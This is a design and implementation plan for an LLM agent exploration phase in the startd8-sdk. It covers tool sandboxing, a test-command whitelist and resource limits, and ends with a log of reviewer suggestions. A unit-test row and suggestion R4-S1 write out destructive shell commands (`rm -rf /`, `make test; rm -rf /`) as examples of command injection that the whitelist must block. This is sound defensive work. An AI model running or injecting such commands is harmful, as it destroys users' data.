# Tool-Using Phase Handler — Implementation Plan

## 1. Architecture Summary

The `ToolUsingPhaseHandler` is a new abstract base class extending `AbstractPhaseHandler` (defined in `artisan_contractor.py` at line 458). It adds an LLM agent loop with tool_use support. The `ExplorePhaseHandler` is the first concrete implementation, providing read-only codebase exploration tools.

The implementation sits within the startd8-sdk codebase.

---

## 2. File-by-File Breakdown

### New Files to Create

| File | Purpose |
|---|---|
| `src/startd8/contractors/tool_using_handler.py` | `ToolUsingPhaseHandler` base class, `ToolExecutionError`, agent loop, OTel descriptors |
| `src/startd8/contractors/explore_handler.py` | `ExplorePhaseHandler` concrete implementation, 4 core tools + conditional `query_code_structure` (manifest), sandboxing, prompt builder, output parser |
| `tests/unit/contractors/test_tool_using_handler.py` | Unit tests for abstract agent loop |
| `tests/unit/contractors/test_explore_handler.py` | Unit tests for tools, sandboxing, output parsing |
| `tests/integration/contractors/test_explore_integration.py` | Integration tests with workflow |

### Files to Modify

| File | Changes |
|---|---|
| `src/startd8/contractors/artisan_contractor.py` | Add `EXPLORE` to `WorkflowPhase` enum (before PLAN). Do NOT add to `ordered()` — backward compatible |
| `src/startd8/contractors/context_schema.py` | Add `ExplorePhaseOutput` model, add `"explore"` entry/exit requirements |
| `src/startd8/contractors/artisan_phases/__init__.py` | Add re-exports for new classes |
| `src/startd8/exceptions.py` | Add `ToolExecutionError(Startd8Error)` |

---

## 3. Anthropic SDK tool_use Usage

### Current Patterns in Codebase

1. **`ClaudeAgent._make_api_call()`** — Uses `async_client.messages.create()` with `model`, `max_tokens`, `messages`. Does NOT pass `tools`. Single-turn only.
2. **`MCPGateway._execute_mcp_skill()`** — Uses `client.messages.create()` WITH `tools` parameter. Iterates `response.content` blocks. Already validates tool_use response format.

### Decision: Direct Anthropic Client (Not ClaudeAgent)

`ClaudeAgent` is async-first and single-turn. Modifying it would violate single-responsibility. Instead, instantiate the synchronous `Anthropic` client directly in `ToolUsingPhaseHandler.__init__()`, matching the MCPGateway pattern.

This is safe because `AbstractPhaseHandler.execute()` is synchronous, and the orchestrator runs handlers in a `ThreadPoolExecutor` for timeout enforcement.

### API Call Pattern

```python
response = self.client.messages.create(
    model=self.model,
    max_tokens=8192,
    system=system_prompt,
    tools=tools,
    messages=messages,
)
# response.stop_reason: "tool_use" | "end_turn" | "max_tokens"
# response.content: list of TextBlock / ToolUseBlock
# response.usage: .input_tokens, .output_tokens
```

---

## 4. Agent Loop Implementation

### Message Management

1. **Init**: `[{"role": "user", "content": self._build_initial_message(context)}]`
2. **On `stop_reason == "end_turn"`**: Append assistant message, break
3. **On `stop_reason == "tool_use"`**: Append assistant message, execute tools, append tool_results as user message
4. **On `stop_reason == "max_tokens"`**: Treat as forced end, break

### Stop Conditions

1. `response.stop_reason == "end_turn"` — LLM is done
2. `iteration >= self.max_iterations` — iteration budget exhausted
3. `(total_input_tokens + total_output_tokens) > self.token_budget` — token budget exhausted
4. `response.stop_reason == "max_tokens"` — response truncated

### Token Budget Check

Check AFTER adding response tokens but BEFORE executing tools. Prevents wasting tool execution time when budget is exceeded.

### Abstract Methods

All must be implemented by subclasses:
- `get_tools() -> list[dict]`
- `handle_tool_use(tool_name, tool_input) -> str`
- `get_system_prompt(context) -> str`
- `parse_final_output(messages, context) -> dict`
- `_build_initial_message(context) -> str`

---

## 5. Tool Implementations (ExplorePhaseHandler)

### `_read_file(path, start_line=None, end_line=None) -> str`
- Resolve to absolute path, validate under `project_root`
- Read with `Path.read_text()`
- Slice lines if range specified (1-indexed, inclusive)
- Cap at 10,000 lines
- Return with line numbers prepended (`cat -n` style)
- On error: return error string (don't raise — LLM should see errors)

### `_search_codebase(pattern, file_glob=None, max_results=50) -> str`
- Use `subprocess.run(["grep", "-rn", "--include=<glob>", pattern, project_root])` with timeout
- Limit to `max_results` matches
- Return formatted: `file_path:line_number:matched_line`
- Restrict to `project_root`

### `_list_directory(path, recursive=False) -> str`
- Validate path under project_root
- Recursive: `pathlib.Path.rglob("*")` with depth limit (3 levels)
- Non-recursive: `pathlib.Path.iterdir()`
- Cap at 500 entries
- Return with file types and sizes

### `_run_test(command, timeout_seconds=60) -> str`
- Validate against whitelist regex: `^(python3?\s+-m\s+pytest|python3?\s+-m\s+unittest|npm\s+test|npx\s+jest|cargo\s+test|go\s+test|make\s+test)`
- Run with `subprocess.run(command, shell=True, cwd=project_root, timeout=min(timeout_seconds, 60), capture_output=True)`
- Return combined stdout + stderr, truncated to 5,000 chars
- On timeout: return descriptive error message

### `_query_code_structure(action, target, max_depth=3) -> str` (conditional — requires `ManifestRegistry`)

Only registered when `self.manifest_registry is not None`. Pure in-memory lookup, no I/O.

- **`element_summary`**: `self.manifest_registry.file_element_summary(target)` → formatted list of FQNs, signatures, line spans for all elements in the file
- **`lookup`**: `self.manifest_registry.lookup(target)` → element details (signature, docstring, line span, decorators)
- **`callers_of`**: `self.manifest_registry.callers_of(target)` → list of direct callers with FQN + call site line
- **`blast_radius`**: `self.manifest_registry.blast_radius(target, max_depth=max_depth)` → transitive caller tree with count summary
- On unknown action: return error string listing valid actions
- On FQN not found: return descriptive message (not an exception — LLM should see the miss and adjust)

### `_manifest_tools() -> list[dict]` (conditional tool registration)

Returns the `query_code_structure` tool schema when `ManifestRegistry` is available, empty list otherwise. Called by `get_tools()`:

```python
def get_tools(self):
    return [read_file, search_codebase, list_directory, run_test] + self._manifest_tools()

def _manifest_tools(self):
    if not self.manifest_registry:
        return []
    return [{"name": "query_code_structure", ...}]
```

### `_render_manifest_context(context) -> str` (system prompt helper)

Renders manifest structural context for the system prompt with a budget of `manifest_context_budget` (default 4,000 chars). Progressive truncation strategy:
1. Full element summaries for issue-referenced files
2. Top-N elements by caller count (if budget exceeded)
3. Count-only summary (if still exceeded)

Returns empty string when `ManifestRegistry` is absent.

---

## 6. Sandboxing and Safety

### Path Restriction

Shared `_validate_path()` method used by all path-accepting tools:
- Resolve to absolute path
- Verify under `project_root.resolve()`
- Check symlink targets don't escape
- Raise `ToolExecutionError` on violation

### Resource Limits

| Limit | Default | Enforcement |
|---|---|---|
| `max_iterations` | 15 | Loop counter |
| `token_budget` | 50,000 | Post-response check |
| `tool_timeout_seconds` | 30.0 | `subprocess.run(timeout=...)` |
| `run_test` hard cap | 60s | `min(user_timeout, 60)` |
| File read cap | 10,000 lines | `_read_file()` slicing |
| Search results cap | 50 matches | `_search_codebase()` truncation |
| Directory listing cap | 500 entries | `_list_directory()` truncation |

### No Destructive Operations

Read-only + test-only tool set:
- No file writes or deletes
- Command whitelist prevents arbitrary execution
- No git operations

---

## 7. OTel Instrumentation

### Existing Patterns Used

- `_OTEL_DESCRIPTORS` dict at module level (static manifest)
- `_NoOpSpan`/`_NoOpTracer` fallback for when OTel is not installed
- `tracer.start_as_current_span(name, attributes={})` context manager
- `span.set_attribute()` and `span.add_event()`

### New Spans

**Per-iteration child span:**
```
name: "explore.iteration.{n}"
attributes: explore.iteration, explore.tool_calls_this_iteration,
            explore.cumulative_tokens, explore.model
events: "tool_call" per tool (name, input_summary, duration_ms, result_length, success)
```

**Phase-level attributes** (on parent `phase.explore` span):
```
explore.total_iterations, explore.total_tool_calls, explore.total_tokens,
explore.cost_usd, explore.fault_files (JSON), explore.root_cause_summary (200 chars)
```

---

## 8. Integration with ArtisanContractorWorkflow

### WorkflowPhase Enum

Add `EXPLORE = "explore"` before `PLAN`. Do NOT add to `ordered()` — this keeps backward compatibility. Hybrid workflows explicitly include it:

```python
workflow = ArtisanContractorWorkflow(
    config=WorkflowConfig(cost_budget=5.0),
    phases=[WorkflowPhase.EXPLORE] + WorkflowPhase.ordered(),
)
workflow.register_handler(WorkflowPhase.EXPLORE, explore_handler)
```

### Context Flow

Handler writes directly to context dict: `context["localization"] = output`

This matches existing patterns — handlers mutate `context` directly (e.g., `context["design_results"]`).

**ManifestRegistry wiring**: The `ExplorePhaseHandler` constructor accepts an optional `manifest_registry` parameter. The caller (typically `ArtisanContractorWorkflow` or a script) is responsible for constructing the `ManifestRegistry` and passing it in:

```python
# In workflow setup or script
from startd8.observability.manifest import ManifestRegistry

manifest = ManifestRegistry.from_cache(project_root)  # None if no cache
explore_handler = ExplorePhaseHandler(
    project_root=project_root,
    manifest_registry=manifest,  # None = 4-tool mode, present = 5-tool mode
    model="claude-sonnet-4-20250514",
)
```

The handler does NOT attempt to generate or load manifests itself — it is a pure consumer.

**Enriched output schema**: When `ManifestRegistry` is available, `parse_final_output()` includes manifest-enriched fields:

```python
context["localization"] = {
    # Core fields (always present)
    "fault_files": [...],
    "root_cause": "...",
    "relevant_code": {...},
    "affected_tests": [...],
    "fix_approach": "...",

    # Manifest-enriched fields (present only when ManifestRegistry available)
    "target_fqns": ["startd8.auth._validate_token", ...],      # FQN-precise localization
    "blast_radius": {"startd8.auth._validate_token": 7, ...},  # Transitive caller count
}
```

Downstream phases MUST tolerate absent manifest-enriched fields (graceful degradation).

### Context Validation

- **Entry requirements** for `"explore"`: `["project_root"]`
- **Exit model** `ExplorePhaseOutput`: validates `localization` has `fault_files`, `root_cause`, `fix_approach`. Fields `target_fqns` and `blast_radius` are `Optional` — not validated as required
- **Exit keys**: `["localization"]`
- Downstream DESIGN phase receives localization as additive context — no changes to DESIGN entry requirements needed

---

## 9. Unit Test Plan

### `test_tool_using_handler.py`

| Test | Validates |
|---|---|
| `test_dry_run_returns_immediately` | Returns `{output: None, cost: 0}` |
| `test_end_turn_stops_loop` | Loop runs exactly 1 iteration |
| `test_tool_use_loop_executes_tools` | `handle_tool_use()` called correctly |
| `test_max_iterations_caps_loop` | Exits after N iterations |
| `test_token_budget_caps_loop` | Exits when budget exceeded |
| `test_cost_calculated_correctly` | Uses PricingService formula |
| `test_metadata_includes_all_fields` | iterations, tool_calls, tokens, model |
| `test_tool_execution_error_returns_error_string` | Error passed to LLM, not raised |
| `test_multiple_tool_calls_in_single_response` | Both executed, both results returned |
| `test_parse_final_output_called_with_full_history` | Gets complete message history |

### `test_explore_handler.py`

| Test | Validates |
|---|---|
| `test_read_file_returns_contents` | File contents returned |
| `test_read_file_with_line_range` | Slicing works |
| `test_read_file_outside_project_root_rejected` | Path escape blocked |
| `test_read_file_symlink_escape_rejected` | Symlink escape blocked |
| `test_read_file_caps_at_10000_lines` | Large file truncated |
| `test_search_codebase_finds_pattern` | Regex matches returned |
| `test_search_codebase_respects_file_glob` | Glob filter works |
| `test_search_codebase_caps_results` | Max results enforced |
| `test_list_directory_non_recursive` | Only immediate children |
| `test_list_directory_recursive` | Subdirectory contents included |
| `test_run_test_whitelisted_command` | pytest accepted |
| `test_run_test_non_whitelisted_rejected` | `rm -rf /` rejected |
| `test_run_test_timeout_enforced` | Timeout message returned |
| `test_run_test_hard_cap_60s` | 120s request → 60s actual |
| `test_get_tools_returns_four_tools` | Correct tool schemas (no manifest) |
| `test_get_tools_returns_five_tools_with_manifest` | Includes `query_code_structure` when `ManifestRegistry` provided |
| `test_query_code_structure_element_summary` | Routes to `manifest_registry.file_element_summary()` |
| `test_query_code_structure_callers_of` | Routes to `manifest_registry.callers_of()` |
| `test_query_code_structure_blast_radius` | Routes to `manifest_registry.blast_radius()` with `max_depth` |
| `test_query_code_structure_unknown_fqn` | Returns descriptive error, not exception |
| `test_system_prompt_includes_codebase_summary` | Summary in prompt |
| `test_system_prompt_includes_manifest_context` | Manifest structural context rendered when registry present |
| `test_system_prompt_omits_manifest_when_absent` | No manifest content when registry is None |
| `test_manifest_context_budget_truncation` | Progressive truncation at 4000 char budget |
| `test_parse_final_output_extracts_localization` | Dict extraction works |
| `test_parse_final_output_includes_target_fqns` | FQN fields extracted when present |
| `test_parse_final_output_tolerates_missing_fqns` | Graceful when manifest fields absent |

### Mocking Strategy

- Mock Anthropic client via `unittest.mock.patch` or constructor injection
- Mock `subprocess.run` for `_run_test`
- Mock `ManifestRegistry` via constructor injection (`manifest_registry=mock_registry`) — duck-type with `file_element_summary()`, `callers_of()`, `blast_radius()`, `lookup()` methods
- Use `tmp_path` fixture for filesystem tests
- Test both `manifest_registry=None` (4-tool mode) and `manifest_registry=mock` (5-tool mode) paths

---

## 10. Integration Test Plan

| Test | Validates |
|---|---|
| `test_explore_phase_in_workflow_dry_run` | Workflow with EXPLORE completes |
| `test_explore_handler_writes_to_context` | `context["localization"]` populated |
| `test_explore_cost_feeds_into_workflow_budget` | Cost budget enforcement works |
| `test_explore_timeout_respected` | `PhaseStatus.TIMED_OUT` returned |
| `test_explore_context_available_to_design_phase` | DESIGN receives localization |
| `test_checkpoint_includes_explore_results` | Checkpoint JSON has explore output |
| `test_explore_with_manifest_enriches_output` | `target_fqns` and `blast_radius` present when `ManifestRegistry` provided |
| `test_explore_without_manifest_still_succeeds` | Graceful degradation: 4-tool mode produces valid localization |

---

## 11. Risks and Unknowns

### Risk 1: WorkflowPhase Enum Extension (MEDIUM)
Adding `EXPLORE` changes the enum. Mitigated by NOT adding to `ordered()` — existing workflows unaffected. New checkpoints with `"explore"` won't load in older SDK versions (forward-only compatibility, acceptable).

### Risk 2: Sync vs Async (LOW)
Using sync `Anthropic` client inside `execute()` is safe — handlers run in their own thread via `ThreadPoolExecutor`.

### Risk 3: Cost Calculation (LOW)
Use existing `PricingService.calculate_cost_breakdown()` rather than reimplementing. Already has per-model pricing data.

### Risk 4: Output Parsing Robustness (MEDIUM)
LLM may not follow expected format. Mitigations:
- Try JSON extraction first (fenced code blocks)
- Regex fallback for key fields
- Return partial result with `parse_error: True` rather than crashing

### Risk 5: run_test Security Surface (MEDIUM)
Even whitelisted commands run arbitrary test suites. v1 mitigation: command whitelist. Production: consider containerized execution, network isolation.

### Risk 6: _build_initial_message Not on Base Class
Design doc only defines it on `ExplorePhaseHandler`. Should be abstract on `ToolUsingPhaseHandler` — every subclass needs its own initial message.

---

## 12. Implementation Sequencing

### Phase 1: Foundation (Day 1, AM)
1. Add `EXPLORE` to `WorkflowPhase` enum (not to `ordered()`)
2. Add `ExplorePhaseOutput` to context_schema.py
3. Create `ToolExecutionError`
4. Implement `ToolUsingPhaseHandler` base class with agent loop

### Phase 2: Tools (Day 1, PM)
5. Implement `ExplorePhaseHandler`:
   - `_validate_path()` sandboxing
   - 4 core tool implementations
   - Conditional `_query_code_structure()` + `_manifest_tools()` (routes to `ManifestRegistry`)
   - `_render_manifest_context()` with progressive truncation (4000 char budget)
   - `get_system_prompt()`, `_build_initial_message()`

### Phase 3: Output Parsing (Day 2, AM)
6. Implement `parse_final_output()` with JSON + regex fallback
7. Wire context writing: `context["localization"] = output`

### Phase 4: OTel + Tests (Day 2, PM)
8. OTel instrumentation
9. Unit tests for `ToolUsingPhaseHandler`
10. Unit tests for `ExplorePhaseHandler`
11. Integration tests

### Phase 5: Polish (Day 3, AM — if needed)
12. Update `__init__.py` exports
13. Verify workflow integration
14. Documentation

---

## 13. Relationship to Code Manifest

The EXPLORE phase may have both a Code Manifest (`ManifestRegistry` instance) and Context Bridge output (`context["bridge_context"]`) available simultaneously. These are **complementary, not conflicting** data sources:

| Dimension | Code Manifest (ManifestRegistry) | Context Bridge (ContextBridgeResult) |
|-----------|--------------------------------|--------------------------------------|
| **Granularity** | Per-element: FQNs, signatures, spans, call graph | Per-file/per-service: capability inventory, service dependencies, LOC |
| **EXPLORE usage** | `query_code_structure` tool (interactive) + system prompt structural context (static) | `codebase_summary` in system prompt (static) |
| **Output enrichment** | `target_fqns`, `blast_radius` in localization report | `fault_files`, `relevant_code` (file-level) |
| **Cost** | Zero (in-memory lookup of pre-computed static analysis) | Zero (deterministic transformation) |
| **Availability** | Requires `startd8 manifest generate` or cache from prior run | Requires Eagle + ContextCore installed |

**Implementation guidelines:**

1. **Constructor injection**: `ExplorePhaseHandler.__init__(manifest_registry=None)` — caller provides, handler consumes. Handler never generates or loads manifests.
2. **Conditional tool registration**: `get_tools()` returns 4 tools when `manifest_registry is None`, 5 tools when present. The `_manifest_tools()` helper encapsulates this.
3. **System prompt enrichment**: `_render_manifest_context()` injects element summaries and call graph data into the system prompt within a `manifest_context_budget` (default 4000 chars). Returns empty string when absent.
4. **Graceful degradation**: All manifest-dependent paths are guarded by `if self.manifest_registry:`. The handler MUST function identically in 4-tool mode — the 5th tool and enriched output fields are additive, never required.
5. **Context key namespace**: `context["project_manifests"]` (Code Manifest), `context["bridge_context"]` (Context Bridge), `context["localization"]` (EXPLORE output) — non-overlapping, no merge logic needed.

This mirrors the pattern established in the Context Bridge Plan (Section 12) and the Code Manifest Phase 4/6 pipeline requirements (GD-1 through GD-5 graceful degradation clauses).

---

## Critical Files

| File | Why |
|---|---|
| `src/startd8/contractors/artisan_contractor.py` | AbstractPhaseHandler + WorkflowPhase to extend |
| `src/startd8/contractors/context_schema.py` | Context validation to add explore entry/exit |
| `src/startd8/mcp/gateway.py` (line 623-698) | Reference pattern for Anthropic SDK tool_use |
| `src/startd8/agents/claude.py` | Reference for client init, cost tracking |
| `src/startd8/costs/pricing.py` | PricingService to reuse for cost calculation |
| `src/startd8/observability/manifest.py` | `ManifestRegistry` — optional dependency for `query_code_structure` tool and system prompt enrichment |

---

## Appendix: Iterative Review Log (Applied / Rejected Suggestions)

This appendix is intentionally **append-only**. New reviewers (human or model) should add suggestions to Appendix C, and then once validated, record the final disposition in Appendix A (applied) or Appendix B (rejected with rationale).

### Reviewer Instructions (for humans + models)

- **Before suggesting changes**: Scan Appendix A and Appendix B first. Do **not** re-suggest items already applied or explicitly rejected.
- **When proposing changes**: Append them to Appendix C using a unique suggestion ID (`R{round}-S{n}`).
- **When endorsing prior suggestions**: If you agree with an untriaged suggestion from a prior round, list it in an **Endorsements** section after your suggestion table. This builds consensus signal — suggestions endorsed by multiple reviewers should be prioritized during triage.
- **When validating**: For each suggestion, append a row to Appendix A (if applied) or Appendix B (if rejected) referencing the suggestion ID. Endorsement counts inform priority but do not auto-apply suggestions.
- **If rejecting**: Record **why** (specific rationale) so future models don't re-propose the same idea.

### Areas Substantially Addressed

- **architecture**: 14 suggestions applied (R9-S8, R9-S10, R10-S1, R10-S5, R1-S2, R1-S6, R2-S2, R2-S3, R2-S8, R5-S2, R5-S9, R6-S6, R7-S9, R8-S4)
- **data**: 18 suggestions applied (R9-S3, R10-S3, R1-S9, R2-S6, R3-S1, R3-S8, R4-S3, R4-S7, R4-S8, R5-S3, R5-S8, R6-S2, R6-S4, R6-S5, R7-S3, R7-S8, R8-S3, R9-S10)
- **interfaces**: 10 suggestions applied (R9-S5, R1-S4, R3-S2, R3-S3, R3-S10, R4-S9, R5-S4, R6-S3, R7-S4, R8-S6)
- **ops**: 8 suggestions applied (R10-S4, R1-S7, R3-S7, R4-S5, R5-S5, R6-S1, R8-S1, R8-S5)
- **risks**: 4 suggestions applied (R9-S4, R1-S3, R1-S10, R2-S4)
- **security**: 11 suggestions applied (R9-S1, R9-S9, R10-S2, R1-S1, R1-S5, R2-S1, R5-S1, R5-S10, R7-S1, R7-S10, R8-S2)
- **validation**: 7 suggestions applied (R9-S7, R1-S8, R3-S4, R3-S5, R4-S1, R4-S6, R5-S7)

### Areas Needing Further Review

All areas have reached the substantially addressed threshold.

### Appendix A: Applied Suggestions

| ID | Suggestion | Source | Implementation / Validation Notes | Date |
|----|------------|--------|----------------------------------|------|
| R1-S1 | Scrub environment variables and pass an explicit minimal env dict to subprocess calls in _run_test. | claude-4 (claude-opus-4-6) | Inheriting the full parent environment in subprocess calls exposes secrets (API keys, DB URLs) to untrusted test code. This is a critical security gap that is cheap to fix and high impact if exploited. | 2026-02-20 02:09:03 UTC |
| R1-S2 | Promote _build_initial_message to an @abstractmethod on ToolUsingPhaseHandler. | claude-4 (claude-opus-4-6) | The plan's own Risk 6 acknowledges this gap. Without it, subclasses that forget the method get a cryptic AttributeError at runtime instead of a clear TypeError at instantiation. This is a straightforward fix that enforces the intended contract. | 2026-02-20 02:09:03 UTC |
| R1-S3 | Define explicit behavior when the agent loop exits due to budget/iteration exhaustion without an LLM end_turn. | claude-4 (claude-opus-4-6) | Budget exhaustion is a predictable operational scenario. Without explicit handling, parse_final_output receives an incomplete conversation and will likely fail or produce garbage. A forced-completion strategy (final summarization call or explicit partial-result handling) is essential for robustness. | 2026-02-20 02:09:03 UTC |
| R1-S4 | Define a structured ToolResult type (with content, is_error, truncated) instead of returning bare strings from handle_tool_use. | claude-4 (claude-opus-4-6) | The Anthropic API's tool_result block supports is_error, which materially changes LLM behavior. A bare string conflates success and error, and the current plan contradicts the requirements doc on error handling. A structured type resolves both issues cleanly. | 2026-02-20 02:09:03 UTC |
| R1-S5 | Replace shell=True in _run_test with explicit argument list construction to prevent shell injection. | claude-4 (claude-opus-4-6) | shell=True with string commands is a well-known injection vector. Regex validation on the whole string is insufficient because shell metacharacters (;, |, &&, $()) can bypass prefix-anchored patterns. This is a critical security fix that directly overlaps with R2-S1. | 2026-02-20 02:09:03 UTC |
| R1-S6 | Accept an injected Anthropic client or client factory instead of hard-coding instantiation in __init__. | claude-4 (claude-opus-4-6) | Constructor injection dramatically improves testability (no module-level patching), supports custom retry/proxy configurations, and is a low-effort architectural improvement. The plan's own mocking strategy section acknowledges the pain of patching. | 2026-02-20 02:09:03 UTC |
| R1-S7 | Record a termination_reason in both OTel spans and the returned metadata dict when the loop exits. | claude-4 (claude-opus-4-6) | Without a termination_reason field, operators cannot distinguish successful completion from budget exhaustion in dashboards or alerting. This is a low-cost addition with high operational value for tuning max_iterations and token_budget. | 2026-02-20 02:09:03 UTC |
| R1-S8 | Validate tool schemas returned by get_tools() at registration or first execution time. | claude-4 (claude-opus-4-6) | Malformed tool definitions cause cryptic 400 errors deep in the agent loop. Fail-fast validation at registration time gives clear, actionable errors and is especially important since get_tools is an abstract method every subclass must implement. | 2026-02-20 02:09:03 UTC |
| R1-S9 | Add a base-class safety net that caps individual tool result size (e.g., 30,000 chars) with truncation notice. | claude-4 (claude-opus-4-6) | Per-tool limits (line counts, result counts) don't protect against extremely long individual lines (minified JS, data files). A base-class truncation wrapper is a simple, universal safety net that prevents context window blowout and token waste. | 2026-02-20 02:09:03 UTC |
| R1-S10 | Handle max_tokens response truncation explicitly, addressing partial tool_use blocks and incomplete text. | claude-4 (claude-opus-4-6) | A truncated response may contain unparseable partial JSON for tool_use blocks. Appending it as-is corrupts the conversation. This is distinct from budget exhaustion (R1-S3) and needs specific handling — either discarding partial blocks or retrying with higher max_tokens. | 2026-02-20 02:09:03 UTC |
| R2-S1 | Remove shell=True from _run_test and use shlex.split() with strict executable validation. | gemini-3 (gemini-3-pro-preview) | This is substantively identical to R1-S5 and equally critical. Shell injection via shell=True is a well-documented attack vector that regex whitelisting cannot fully mitigate. Accepting both to ensure the fix is tracked. | 2026-02-20 02:09:03 UTC |
| R2-S2 | Inject the LLM client or use a factory instead of direct Anthropic instantiation. | gemini-3 (gemini-3-pro-preview) | Substantively identical to R1-S6. Constructor injection improves testability and flexibility. Accepting to ensure coverage from both review rounds. | 2026-02-20 02:09:03 UTC |
| R2-S3 | Have the handler return data in its output dict rather than mutating context directly; let the orchestrator update context. | gemini-3 (gemini-3-pro-preview) | The plan says the handler writes directly to context, but if AbstractPhaseHandler's contract expects the workflow to manage state transitions based on return values, direct mutation violates this contract. Standardizing on return-value-based output keeps the separation of concerns clean. | 2026-02-20 02:09:03 UTC |
| R2-S4 | Implement stuck-loop detection for repeated identical tool calls. | gemini-3 (gemini-3-pro-preview) | LLM loops (e.g., reading the same file repeatedly) are a well-known failure mode that wastes tokens and time. Detecting N consecutive identical tool calls and forcing termination or progression is a simple, high-value safeguard. | 2026-02-20 02:09:03 UTC |
| R2-S6 | Handle binary files gracefully in _read_file by detecting and returning a descriptive skip message. | gemini-3 (gemini-3-pro-preview) | Reading binary files (.pyc, images, compiled assets) will either raise UnicodeDecodeError or produce garbage that wastes context tokens and confuses the LLM. A simple binary detection check (e.g., null byte sniffing) is trivial to implement and prevents a predictable failure mode. | 2026-02-20 02:09:03 UTC |
| R2-S8 | Define _build_initial_message as an abstract method in ToolUsingPhaseHandler. | gemini-3 (gemini-3-pro-preview) | Duplicate of R1-S2 and R1-F2. The plan's Risk 6 identifies this but doesn't mandate it. Essential for enforcing the subclass contract at instantiation time. | 2026-02-20 02:09:03 UTC |
| R3-S1 | Define message history management with maximum bounds and truncation strategy for long conversations. | claude-4 (claude-opus-4-6) | This is a critical gap. With 15 iterations and large tool results, the conversation can easily exceed the model's context window. The plan tracks cumulative token usage but never manages the growing prompt size. Without truncation/summarization, the LLM will error or silently lose context. | 2026-02-20 02:15:20 UTC |
| R3-S2 | Define ToolResult dataclass and update handle_tool_use signature from str to ToolResult. | claude-4 (claude-opus-4-6) | R1-F1 established the concept of ToolResult but the type was never formally defined. Without a concrete dataclass, subclass implementers have nothing to import and the base class wrapper can't distinguish success from failure. This is a fundamental interface contract gap. | 2026-02-20 02:15:20 UTC |
| R3-S3 | Define _call_llm method signature, error handling, and retry policy explicitly. | claude-4 (claude-opus-4-6) | This method is called every iteration but never defined anywhere — not abstract, not concrete. It's the most critical internal interface. Without retry policy specification, transient API errors will crash the entire phase. The proposed specification is reasonable and necessary. | 2026-02-20 02:15:20 UTC |
| R3-S4 | Add tool schema validation at handler registration time, not just at LLM call time. | claude-4 (claude-opus-4-6) | Malformed tool schemas from subclasses would only surface at runtime during the first LLM call, deep in the agent loop. Validating at registration/init time is a standard defensive practice, especially since get_tools() is abstract and will be implemented by external developers. | 2026-02-20 02:15:20 UTC |
| R3-S5 | Validate parse_final_output return value against ExplorePhaseOutput schema before writing to context. | claude-4 (claude-opus-4-6) | Without validation between parse_final_output and context writing, missing required fields like fault_files will cause downstream DESIGN phase to fail with opaque KeyErrors. The distinction between partial results and validation failures needs to be explicit. | 2026-02-20 02:15:20 UTC |
| R3-S6 | Define structured logging for the agent loop with workflow run correlation. | claude-4 (claude-opus-4-6) | OTel traces are great but not always accessible to operators troubleshooting in production. Structured logging with structlog (already used in the codebase) is essential for operational visibility. The specification of what goes at INFO vs DEBUG level prevents log volume explosions. | 2026-02-20 02:15:20 UTC |
| R3-S7 | Specify behavior and recoverability when the agent loop terminates abnormally. | claude-4 (claude-opus-4-6) | The plan only covers clean stop conditions. For a phase that runs minutes and costs dollars, losing all progress on transient failure with no partial results or cost tracking is a significant operational risk. The proposal to always return partial metadata on failure is especially important. | 2026-02-20 02:15:20 UTC |
| R3-S8 | Bound and deduplicate relevant_code snippets in localization output to prevent downstream context bloat. | claude-4 (claude-opus-4-6) | The plan caps individual tool outputs but not the aggregated output flowing to DESIGN. Unbounded relevant_code could inject thousands of lines into the DESIGN prompt. The proposed caps (10 entries, 50 lines each, 5K total) are reasonable data contract constraints. | 2026-02-20 02:15:20 UTC |
| R3-S10 | Define _calculate_cost method signature and explicitly scope it to LLM token cost only. | claude-4 (claude-opus-4-6) | The method is called in execute() but never defined. Explicitly stating it delegates to PricingService and covers LLM-only cost (not compute) sets correct operator expectations for budget setting. | 2026-02-20 02:15:20 UTC |
| R4-S1 | Anchor run_test whitelist regex with $ and reject shell metacharacters to prevent command injection. | gemini-3 (gemini-3-pro-preview) | This is a critical security fix. With shell=True and an unanchored regex, `make test; rm -rf /` passes the whitelist. This must be addressed — it's the most important security suggestion in the entire review. | 2026-02-20 02:15:20 UTC |
| R4-S3 | Define fallback strategy for parse_final_output failure that respects ExplorePhaseOutput schema. | gemini-3 (gemini-3-pro-preview) | Directly complements R3-S5. If parse_final_output fails and returns a partial result missing required fields like fault_files, context validation will crash. The fallback must produce schema-valid output (even with defaults like empty list) to prevent downstream failures. | 2026-02-20 02:15:20 UTC |
| R4-S5 | Truncate explore.fault_files OTel attribute to prevent span rejection by collectors. | gemini-3 (gemini-3-pro-preview) | Low severity but trivially implementable and prevents real operational issues. OTel collectors commonly reject spans with attributes over certain sizes. Truncating to 10 items or 1KB is a sensible defensive measure. | 2026-02-20 02:15:20 UTC |
| R4-S6 | Use process groups and os.killpg for run_test timeout enforcement to prevent zombie processes. | gemini-3 (gemini-3-pro-preview) | With shell=True, subprocess.run timeout only kills the shell process, not child processes. This is a well-known issue that leads to zombie processes and resource exhaustion. Using start_new_session=True and os.killpg is the standard fix. | 2026-02-20 02:15:20 UTC |
| R4-S7 | Cap line length in _read_file and _search_codebase to handle minified files. | gemini-3 (gemini-3-pro-preview) | A minified JS file with one 1MB line bypasses the 10,000 lines cap entirely. This is a realistic edge case that could blow up the token budget in a single tool call. Capping at 1000 chars/line is a simple and effective mitigation. | 2026-02-20 02:15:20 UTC |
| R4-S8 | Define localization as optional entry requirement for DESIGN phase to support hybrid workflows. | gemini-3 (gemini-3-pro-preview) | The plan explicitly supports workflows where EXPLORE is optional (not in ordered()). If DESIGN reads context['localization'] without checking existence, hybrid workflows without EXPLORE will crash. This aligns with R3-F4's partial results handling. | 2026-02-20 02:15:20 UTC |
| R4-S9 | Define on_retry behavior: reset agent loop state (tokens, history) on retry. | gemini-3 (gemini-3-pro-preview) | R3-S7 established that on_retry restarts from iteration 0, but the actual state reset needs to be specified. If conversation history isn't cleared, the retry will send the same failing context. This is essential for retry to be meaningful. | 2026-02-20 02:15:20 UTC |
| R5-S1 | Add input validation for grep pattern (ReDoS prevention) and glob sanitization in _search_codebase. | claude-4 (claude-opus-4-6) | The LLM controls both pattern and file_glob inputs to subprocess. ReDoS via pathological regex is a real DoS vector, and unsanitized globs could match unintended paths. Prior security reviews focused on run_test but left search_codebase under-scrutinized. | 2026-02-20 02:21:54 UTC |
| R5-S2 | Add retry-with-backoff for transient API errors (429, 5xx) inside the agent loop. | claude-4 (claude-opus-4-6) | A single 429 during iteration 8 of 15 would crash the loop and lose all prior work. Phase-level retry (re-running the entire phase) is extremely wasteful for multi-turn loops. Inner-loop retry is essential for robustness. | 2026-02-20 02:21:54 UTC |
